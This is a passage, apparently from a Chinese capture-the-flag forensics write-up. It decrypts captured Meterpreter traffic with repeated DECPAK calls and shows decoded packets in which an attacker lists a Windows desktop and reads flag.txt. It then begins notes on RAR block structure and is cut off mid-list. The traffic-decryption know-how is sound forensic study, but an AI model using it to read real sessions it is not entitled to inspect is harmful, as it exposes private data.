DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef54b835d361e2e784b4e2e9168aa4cd074c5b434009388fb2550a98ee6d49ea108c50b1f1b6c4c17a6fa0b01cd5e04f5fe5ba536da008841f20cef4324fe752f92923ea05e1d683bf991306b6878e301a68c933579c58c47482afc576545cc3cc2610d3f2ee70a3a36404996ff877b3a7756efe57bd043ad32f04ca9a137846cfeb6f53c817f32986117c0f26fc30b60b70a1f072987c80eda747fcc5ae85da2ed3&quot;, AES_key)\n\nprint DECPAK(&quot;2926993adf8c06b90319d8059f51ec99b401f9b42926993b292699b22926993b0438eb2dc77a917a03839c6bb9f6afb8192bbf8baf251e45d7f08cb799975ab8c4661cee35f7d4c9c63b7d1607fabdd602313a66d04c4fe8570ddd650eb2e9595358f04c0e781a347ddb62027dea0a0e899709fa3eeaa238600e4abb48d28fce74817d9ce4a627d36b5ee9e9d59719e4ae246ef1d39f8468dbe5ca236dbee597&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54a64307198e637c0fd0dfc74aad3b1fbcd26e62d8113e05e6af14d5cf78b82c11a0761ba6e95a984da59db055e44b9d5830cf6ec34a0e7ff0686fef9472546c93cd169eebf86e933f424f8a6f116bfa447a286bed01168019eb59eb83f5d455be5bf7fe55c49db5e7752b9b3135d1a4ccb6da5ca2c37af0c9311e6e335bc57642debf54952abd91b589527436429128a062f587edf20a215bf4161253898cc89a146c92c77cc6b34dd782f97007444f674dba89901758b8a7e55f1c82c7f0f0af78b41bae90d0d008518668d7fadf570da991365e09048b70d162b0e0b281cc28df2b64e759e480fa3dab1bb8635f85237205c66d6926fd85c829921956403b454598d57a7185ec80ea7ca1a8494d3c6ed7b7580dfbaaa585f018ca8c8efd5dd15b38e9281c3fc0385312544d7f24cb0fd3e8392fce9f07501028be0b6fa656dccb9247ab9b99fd3ff8cc04199d26398ea7fb4fac7be96769c8fa5f7e0d63cc524f0699104e89c91411d5a2168bbd7b59237b65143f81107667fddc2ba0e5c5382cf4dd672950da2ee088ba8e74039e872d89e69aeca904dac87463bb691075cd888a93d07c9ca792ffc53bd25a8487389a1776ffdfc4232028ea08d5f555d7738574ddd942d95d7cc5d0b086798c991ed140c72257b039a7aa8b61727976c6cd939b3815a4e04e94bafe8d5cb69f9dc11930431207ddc03517ccfd5e4499609b87914c40be1481a5ef174a45ce0fa70e8f6a683a2975a1b6b1905613444dac3ba12e8902d41f6ba2e7c940e347a6fdade78c6560e79f2f2313a90b74af7c1137e0bb3cd9f721af2a13deade2551a4be241b095992a608fb0e5aa063a10207414c2f2c18f7272bcffe0ecac0cfa8b4c2bf2bb3232044cccecaf91ed310d07ca1c&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef5415d984862f64b0e891b131ecc5d2a06c8ec29332954025fa1b2807cb007edcb73bba65e5c12cb31a40db6b26a4fa05a8d3e5a67d3871228a8cd6b6f6ce75a263823fecc17be818e1bd27a4cc9d512372e5f2f58f0aea4a11bfb631ceee791e0f5682f4dd94fc8b1aa59514037a8d76ff8b8d72ca32c2a299049f9089f430e403b9c64419d1eb8b6577c440bec9a16a5c51081ad4040fa32759ef37740c20a1a3893f511b08d37926ae67abedfa4084d1c3cb97f47a130dea915cd000fb51873c&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef549568c9bca4f5201e93dbdb4852d51967a2e9b23cc1a88ce4b2a37950450a8586cde6043906b7803994a8ce6db44ede0258b2b5d29318145c26075ddb963991ad85007119e0ad4de637818aa78e8fbe14631c113894ff87aefc336a427eb6c90cfc4e8b2efb088d63c1a301381cf90270e2b7c96371530800724ed4762f963d17b9ce23ab12cc4d656fbfc999d144f5f7cedee8eb9cc56200d51bede00a242bea&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54e1a628a81569018cd0f5bf315d7b320e5b77b0f8b8345c79e0fc4594a74a390315f368d3c474883c2aa91a6e0573ff936f5bb5aba31790051bb71dc50bba249affef1b06d4fa9d297abbc5142c40a90d031af7e4cf885d6ad3e09bc0338a8d0e8675b7f332797ec9d87c48b37e8a2e3a75c8f80d78c3de96029eb298203090029a32a858b55714fb5a805dcd52c02734d04d04285f729285ba731207c73ee0c7c2ef52ecb3e973e787cce4fd720c83a3a221f8a98de6180c939785c52fec692acb34f3cf2a36de23a850928dd405afd0abd376c4dac3582153ea8de6e3cdf19fd4706688782e9a48b8b05c591abcc892555e2a061601f73a3498bdcbd1f1baf142a6471065d42312b48ded576689a1bb5bcdb877e8160995be495603a4405e2a2892f2b650760640286b1ad93461909518fd8392929e251157b0c5461825badfa065a42bb12b60bb7bc0fdbd62bc376b188f705e76820e832c0226f536b0c2620ab917dbebb346c9bf01c2a0c81832fed64e6f64407d3d7f051c6c8460900c50d2d8c361f57afb5958888c1bf983bd314ea54697d87ce70b9230837a98398b4d1cba073b86615712078079362f6fb1b0c80e2b25af230ce8016a0b0115607f730195f0811d21db64cc422e5b0f73d6fbcc88a0843fbdbed51db87851c940c99e4a0d72d3fa7604caf585b40b962f93cbd252373b78bbecf891975d8e152358534d999fe0008453b9f6952acccdce89d2f31021f67b5d4ae2099ff7b38d92a9f2f7541e9fcf9a89d9b8146dfbee579bfbd933ca07bb7ba04efda4c24cf5e9ca43afdd5bdaea05677fd293bcd74c31b37b24196f8e0d0be9e79831f7794ea91a52db03e8f35230ed75adbb5a0974380905b510883af3be066a03b984af5effc060&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54a74abf08695adaad8be818da14b4dadc981f6157553f5d955e82e35ff422847f969300e94f38c7ec84dcc4fef465f3e62b0fbc142e3761c036cdfe4c5e7a880445ad31a51ee1112a89fec6e8693852d739fbd91d05327c0d6cda8cb26a17c3ae9b43f28774f991afb2545a69210f47d82339c219d7f7bfbd5d76c2a4a82e376ef1d2ff1142a0713b1e055bd6c6c78866e4da63c65cb6d161da9d55222c90984a6295e5b68bf4dce2ce684b9d067c02352b8f3fa457783c911a340f2b9c552fa6&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef545042629ac50792c2d9f387304e12245dcb7bc137fcf865d9548f52c1f4b4d7662a2e5b4a04ce32d51bdb99b725807534a9b288fdcce5512a4801b71d7a97de1624de6175b884a4ef080e2b8b39683a98d86cb9ff8ce0e1c1c7300fc582f2ed5d8f8a2b23b77ddb01e65e059738478f9aab61ec7e93f8f17eb1903786ae1c654edaf7ca60cd5c4d7012bffea32c54f5091952d4ddf7573efe77bda7d974bc4bb3&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54a0c32aa9adca2454808fa09531321b03dade8023acab14d49f4bd36589277683be8ad1f5483cff7411c3db741baca849b7647a94650614d5ca05acadffd7ead06a172d74f279bbcf94a7c1365a1f6c624ae42f39644511bcecdddd516ba7e64280b6ee9300837628b207057b3c1d67abace40bb66ea250c438daac90110725da12c7b4fdca846a84ff3c842355eb5ae9c5814a83f0266e8e304b7c18c99ee2e6dddba999ef6c16bd459f7e5e0133a89f93c139887816477b133e70e333fd2c8187c39b504d983dded4b8d2ed57124dd564ecf36212a8208864dbaa756317d084d85a54066fb1179efb7e1d2ae41d49e5f79691f83676cd6d9d9f7e69ef5be859398c00bbed2dae001f80f7e784ed3ecd37e860a1a0b7eada9cae6cd34a78fd383ffb006597de7a427cf3fe2109edbbc9bbd8a4e58b7e9137c836b0ee899e8228c536e78664cf6f1626a298b635250d1e3c8b67dc33ce96ad33d8562e7bbc2eac3b0268aaec137377fa29542af2ffb940ad168fa6bc28a24d671c71432ac557026f7bd6cb5c4a3d6295ba03f9732138b74c6c0190c6d03cc65ec7ff90dbbd6a033d3d8f464af5523ddc1eec87f4a8920204bea066b62463f7055fc3a3443eb6831e068ff7c7884534c8c961b59ab638cc2c68f996c1e04938e6b36982940470775a8d67842d62db2a8fa297057816e3c1a8494ab8d8605cd363e7b02398f9462b29d4c6ae6d054e34df2de2960da4d2ecdc03da04a8b8c0f0429f5b6d69f654f895d39d538d772a54aa99e6ff4c9f2553a8d562e67de80bb6ce6f7b64f4a15006a97f3e356201b0ec1f35cb01d8e3121658f2f07db46174c1332dcda43e11ea9aab1d6da405ddeea61ebaca8db07aab89dbc971a107144f77d1e34fa5d162da5a&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef547eeb277e493e9d2dad9be2f9bb47f0b6355a47223f26e74ea01c55dbd02f3a256bebb806798caae2813f140c39b000a2b8d366c28b88bf92e71ba5760993884f3661f258cac484858353a5e430f20ab1ea10e2b9d58a92d395804ac305c8620cc25a0e41c33543723871e32dd2551b740e083d9524d8ab912d7d33ebc574ac103aa3b6d960d6812a40eb371be855151846d027dac6694e01d3ce26bcb648309c721316d0baf1c167a1ff4f21181a4f45fd1bb8b4219047d7cdcbbc0befff021c&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef5416d7e52b7aafb3d98d01695ad4dad9c844c16f1f5ab9c6524bd888fa10316d0f8cc027e58ca6abac24105f2b006c5c1687ee80da56344e9915c81c88195897056dbe672a7d5ed6060ca3b079edb8bd7c7137ba8f78160c16fec5ce685439cebd31761f47527f04cf840da0cdb430e5f71f13c6bd45ee04e8aa6670c2f3265b8663c1c9b600f68afd7b943ae566f9e9bf8eab2ea9714bf1fdce89e89e522af060&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef549ed176f02b7f872de8b1a1c09035e4c445e4eefd55f8b21766398cebdbbbac51638200564e211698faade01639890646b5a7df93dbfe2ab6fed342d53fe139f6d698075298003c873a3b394d52d5fa2db04ca3ced01e26f505a9dae196e528cf229390e572fd3c4f49712d4552f182e903e4cab21880065813920d8eb27d40a57b691a8cef7e83abaaec5b6d27b653942481771236a9e1fa96de9fa7013539f4f51a632c7d5377087c1e5ff04ece37e31be0201d8acb15f3ffea099ba7161a8b099fe436babe9ec972f5acd7b1b13c8fc63531a0e48613fe0828f70263c21af801c1cdbae91dc7f05dfd348e9120230dbbe52dfbc7d6f4ff4281a26e04d64ac17be5ffdd46c38bfd4d5f23e536bb976210e764922a9fa1a4a0d32676c2a3ae77376b0fdee2e484877cca94e36d38b7fe4370ab2cd24dd1c1daf37a3025b82c4cdd43808997fbab7ae1bbfb38039f225f238a05c7a43d75d325964cc8709d06e4a0201760bd978ae7719af4f44bde5e55bcfd4cb5e20f71fb9c2ac3bf71eb7b4552f1ea466e11218b291d2311344e72232c71286fc1b41464aff44975bda745c78ae7309c1c6cafdc22833de0585e879d8fa1257421c6372cf5d6159eb927a64b32b4a26f93e119983e1b75dcb51588d666ce3f66078a9f9ed1b843bd82a0d8ba2020869fd49ef9434610961c7d95ce2e43cdf3b4d8cf1a1eaeadcfc0deb5651a6af86cecce1ab15172160eb25c17421e65d34e4efbdd6917860610360b662aa4d7e3fa62157ab07d1e2a2af88f1387fd82df72155f0602ece0ce617215c5bef59a393e0d7cd2572d848510c5c09c78916d6240778f2d2efead1dd1795096554a8100d61bcf1a7d51e5fd22e9633d0673268745990827da0027c7812fbdefb0d1&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54f6cf111c29995e8ddf9cfc68568b392a827cbd823b57a5b72e8a5befc5581afc9a3d62dc240ec020910740d3d782ec0d25232da13f1f1634569d749562e8e9c65de0016af28faa98409554e21b7932eb5587670935ddc66138139828832adb339b6e390090432eb4ea1f292ad9918345903aae300c1ece3e8e04b19d3a95856d908975f370b4e4dbb054f7d2b62325e95578df134e23e15478855f5015318f78d6e5cf9ea0808207153432f12f6c916dba4d73a5b603abd5944ff81873278e0c&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef548a457a00a50fdd743b833ace6e884f5e1ee7d93e1d5465013006b47661b78a31cb121fddc9cad7539a91d2f876775063efb3517bcadb658160ec961b4482cd1ef4ac797936a9061a48318c67ff7e5d2055f8d2b0e7e5fbca0fef43935e23afe3daaee2c0400d950f96c2a41e3a36dc82b6f02f8ce2031d95fee1c4129e3b11e352afa470bc219fd9ebc0f70cec328071cd9ee9c423559debc72a4b82997bcf72&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef5417935c499443c593861b309077d9bde14d10e835529bf1ae2d48cf5eb8732fe500780aef921e1e4c9d42400ef3aa0d8642e9a53a17cc4115093bdfe64b15af6ddb9ba8a928e8aee3c693712a25cc9776956dd2bd88e2eb1b340e49c7c06004025d4018b5cb963edb72d36335c0e46599684bbacba9be975919d374cf36f8036bc85dc7b6eb28f2db271d89f2a6884850fba6a4223a607cfc6ea27ad5967fbf111193c80dc5651e5875bdde2590d3759c6229012c82f571bac7e9c34278a2c6510c5440a563282078f75437a6b83a2795628747c8a42cd1962d5892a301f240fa0ab2ff2ffdc37fd9c31681c7be58bb211fa2a65656612936aee9610785fba11a8fb5eeffecffd28da7257a06147b8b3f7b4840b9e14ff58a62de5d895a72192db8da9bc8eab0018dba287c2259a2424ef2c07320ecf8333bad402ed073fdfec3a9074e4ac483adffaae6827363292969b0a8b667ce87608c280eea0d588636862e7c685a1098c4cfe5be6ced796dcb68a13dc8d627c0a1507f29118c873538eca45775ff552df3caeeffd83dda2b690c577a4ac2a6b2ee1fb6292f30b92f653817b1347a2511f4ce6b16b8b326561788207153b8e34abe2c01f18084c39d8d112f30abba79c18fd41364dc6569700ba8e50bfd3698c364c980185e41983b5b8a2123e05c8d2d20e8ff344d45eba3a696c168a41828e89dfd52b933ae2fda939115e33388f8d001f222968cdff85014df2a13012e8ed2de7b7e344016a31fe040c4f499b11405331825d792889f6ff88de901bb22c63b3b2ed03230f466dcfd266b9de98a9555e55612be2488cd4725d8dbc082821d5de0579c71755d2f1546e88eb20a0f4bfd15d6ee97a560e73fd9a428af958e2d8f4359ddb89de5d02e387a&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54673f20ea63ed7dcee5ad41191624f11654116ea6e529188198f3d8c99fb8c7a4cd02d95c775fcd228293c4e07f457fff20f4dd86beecd707729f7e320557c541568e499880bd3d60edd8d517ef847314fa92add61d1ebad74bb38fe874defc674d5c0a185089963ec494879a56af9fd814a476e41e057c4c1a00a9d1f69e1b7c45bbb769791636ae9a42514c366eee52f9f5346c92c6fa9138845f0c3eaf3a30f3f71c048ee4f9fd3e5dec452cde0bf13794ad43c7c7334c1b841294ed61d3bc&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef54bf7b08dd116835468ca87c273505a310dab1059bfd1ba816574d1e3f35f8429788dccf3848b0872bfc5b5d149ca192532ee30b2291bb57fca70ed1fb4f7653445f1c373a74f0e324ea23efdf3c3be17aa51821c4fac4a2b26f73f7ac306ad49b7cbaf5edbdd2e9962a1ee0d3127ae049a5823e8f2ab88879dbb679f37323e1497fdea2d807af51c94a7f8a9a27dbffcc65ee8778848a5315a994b9a7c71c914d&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4efcd2ab4ef543db8b8d5acda5a1235b3ad7d07db722102cd9e53750cef7e31131b2d59afa2206d5adc9c877d8ea88bef37dfdff1ffe46e42443d29429793ab306042ee0b2173de2b24e750a0ec61eae0fb8dc5ba0c9961330cfc253aa550022cbf03120d8561e96d54ff94e08ca352d1c069065caceb101e16845fe69db34893f8cb9f3c1e7749b573c1e3f4f2caf2486620cab399fd&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4efdd2ab4ef54e28b751ce10cff077f8445dfe8ddc32363ccef83833a6e9c72f75026116d0253b77e884b483db4b28ab58a9397911ed8afd892a938b4eaee9806d96c070f1f1e587bca16e8e8e16e2b2af5a530e84cc95221f13ce3c66b391318c11f6740bb16d7216dbf70004cbdf4e451b13cb70223235f7e63a33d32c631f512bd5ca7511b&quot;, AES_key)\n\nprint DECPAK(&quot;2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef8d2ab4ef549df15c8d63e084ea41796e1080c422c10c4af26c0b5563cb3058bd6e4aa3f2cc22de1c6edf7e6468ad7e1ff8fa11bd0d2955218906c89bc9c1aca68485ba41d6c1363d26e1ca77e379eede5843a78cf2890a4a4d48d532564d081638df298d10b5b8e57b4714d29993407e26b857a054f18cbba0769a9d7a3ab9b2fc503b9b4e0f13e3e0e4086d9def861eb75b54df80426839c540b6836702d3585c1d11b1fcc1f56d6a2a58bee99fa22ea3792bd764075cdd0bfe11d2a7953c9174210b35afc3a38ab0ff13abebf06b74046bc902df&quot;, AES_key)\n\n发现攻击者对目录进行了罗列，出现关键词flag.txt\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[24, 65537, &#39;stdapi_fs_getwd\\x00&#39;], [41, 65538, &#39;35193328683991905719198692993325\\x00&#39;], [28, 66736, &#39;C:\\\\Users\\\\PC\\\\Desktop\\x00&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 168, &#39;IV&#39;: &#39;\\xa0\\xf1\\x95U\\x8f\\xbb2!\\x117\\xd5\\x9bD&lt;\\xa0\\x0b&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[21, 65537, &#39;stdapi_fs_ls\\x00&#39;], [41, 65538, &#39;92992205236495284461596905472999\\x00&#39;], [10, 66737, &#39;.\\x00&#39;], [30, 66738, &#39;C:\\\\Users\\\\PC\\\\Desktop\\\\.\\x00&#39;], [9, 66741, &#39;\\x00&#39;], [72, 2147484869, &#39;\\x00\\x00\\x00\\x00mA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00&#39;], [11, 66737, &#39;..\\x00&#39;], [31, 66738, &#39;C:\\\\Users\\\\PC\\\\Desktop\\\\..\\x00&#39;], [9, 66741, &#39;\\x00&#39;], [72, 2147484869, &#39;\\x00\\x00\\x00\\x00\\xffA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x19\\x18._\\x00\\x00\\x00\\x00\\x19\\x18._\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00&#39;], [20, 66737, &#39;desktop.ini\\x00&#39;], [40, 66738, &#39;C:\\\\Users\\\\PC\\\\Desktop\\\\desktop.ini\\x00&#39;], [9, 66741, &#39;\\x00&#39;], [72, 2147484869, &#39;\\x00\\x00\\x00\\x00\\xb6\\x81\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18._\\x00\\x00\\x00\\x00\\x1a\\x18._\\x00\\x00\\x00\\x00\\x18\\x18._\\x00\\x00\\x00\\x00&#39;], [17, 66737, &#39;flag.txt\\x00&#39;], [37, 66738, &#39;C:\\\\Users\\\\PC\\\\Desktop\\\\flag.txt\\x00&#39;], [9, 66741, &#39;\\x00&#39;], [72, 2147484869, &#39;\\x00\\x00\\x00\\x00\\xb6\\x81\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x005\\x00\\x00\\x00\\x00\\x00\\x00\\x00?\\x999_\\x00\\x00\\x00\\x00\\x80\\x999_\\x00\\x00\\x00\\x00?\\x999_\\x00\\x00\\x00\\x00&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 648, &#39;IV&#39;: &quot;&#x3D;&#39;\\xb3\\x1c\\xbe\\xf7*\\xc6\\xac\\xaf\\xdf\\xc5]mR\\xb4&quot;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[23, 65537, &#39;stdapi_fs_stat\\x00&#39;], [41, 65538, &#39;81395400468542538926467524183079\\x00&#39;], [72, 2147484869, &#39;\\x00\\x00\\x00\\x00mA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 200, &#39;IV&#39;: &#39;M\\x8b\\xcf\\xbfIY\\x92\\x9b\\xcf\\x19\\xaeL&lt;\\x90\\x1eC&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[24, 65537, &#39;stdapi_fs_getwd\\x00&#39;], [41, 65538, &#39;65703151916968344032521729631525\\x00&#39;], [28, 66736, &#39;C:\\\\Users\\\\PC\\\\Desktop\\x00&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 168, &#39;IV&#39;: &#39;\\x95\\xcf\\xe7\\x88;\\xdc\\xda\\x13\\xa6\\x1c\\x93r\\x1f\\xb1LE&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[27, 65537, &#39;core_channel_close\\x00&#39;], [41, 65538, &#39;58287235164616228196360033701482\\x00&#39;], [12, 131122, &#39;\\x00\\x00\\x00\\x01&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 152, &#39;IV&#39;: &#39;\\x17\\x0cW\\x80\\x86n\\xb5G\\x1f\\x07B(-o\\x9dt&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[25, 65537, &#39;core_channel_eof\\x00&#39;], [41, 65538, &#39;68965028063958896069137527866199\\x00&#39;], [9, 524300, &#39;\\x01&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 136, &#39;IV&#39;: &#39;\\xc8?\\x9aI\\xcb\\xb8\\x10RU0\\xaa\\x8a\\xc2i,v&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n&#123;&#39;PKT_TYPE&#39;: 1, &#39;TLVS&#39;: [[26, 65537, &#39;core_channel_read\\x00&#39;], [41, 65538, &#39;51236609532627967781124094944166\\x00&#39;], [61, 262196, &#39;flag&#123;Meterpreter_Has_A_Greater_Enc_Method_Than_Shell&#125;&#39;], [12, 131097, &#39;\\x00\\x00\\x005&#39;], [12, 131122, &#39;\\x00\\x00\\x00\\x01&#39;], [12, 131076, &#39;\\x00\\x00\\x00\\x00&#39;], [24, 262605, &#39;\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e&#39;]], &#39;PKT_LENGTH&#39;: 216, &#39;IV&#39;: &#39;\\xb7E\\xb3\\xd8ITk\\xbfk\\xcd\\x81E\\xaap\\xcd\\x94&#39;, &#39;XOR_KEY&#39;: &#39;*\\xb4\\xefU&#39;, &#39;ENC_FLAGS&#39;: 1, &#39;GUID&#39;: &quot;\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d&#39;&#96;\\x8e&quot;&#125;\n\n继续查找就可以发现flag.txt内容。\n\n\n\n\n\n\n\n\n\nflag{Meterpreter_Has_A_Greater_Enc_Method_Than_Shell}\nrar文件组成\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/Claming_D/article/details/105899397\nRAR是有四个文件块组成的，分别是分别是标记块、归档头部块、文件块、结束块，这些块之间没有固定地先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块。\nRAR的标记块和结束块都是固定的7字节序列，分别为0×52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00\n每一块后面都有两个crc校验，在crc之后的字节用于判断块类型。\n# rar文件每个数据块的结构\nHEAD_CRC 校验码，2字节\nHEAD_TYPE 块类型，1字节\nHEAD_FLAGS 块标记，2字节\nHEAD_SIZE 块大小，2字节\n\n# ADD_SIZE 增加块大小，4字节（可选结构）\n\n文件大小的计算分两种情况\n\n当块标记HEAD_FLAGS首位未置1，总块大小是HEAD_SIZE\n当块标记HEAD_FLAGS首位置1，总块大小为HEAD_SIZE+ADD_SIZE\n\n# 常见的块类型\nHEAD_TYPE &#x3D; 0x72 - MARK_HEAD(标记块)\nHEAD_TYPE &#x3D; 0x73 - MAIN_HEAD(压缩文件头)\nHEAD_TYPE &#x3D; 0x74 - FILE_HEAD(文件头)\nHEAD_TYPE &#x3D; 0x75 - COMM_HEAD(旧风格的注释头)\nHEAD_TYPE &#x3D; 0x76 - AV_HEAD(旧风格的授权信息块&#x2F;用户身份信息块)\nHEAD_TYPE &#x3D; 0x77 - SUB_HEAD(旧风格的子块)\nHEAD_TYPE &#x3D; 0x78 - PROTECT_HEAD(旧风格的恢复记录)\nHEAD_TYPE &#x3D; 0x79 - SIGN_HEAD(旧风格的授权信息块&#x2F;用户身份信息块)\nHEAD_TYPE &#x3D; 0x7A - NEWSUB_HEAD(子块)\nHEAD_TYPE &#x3D; 0x7B - 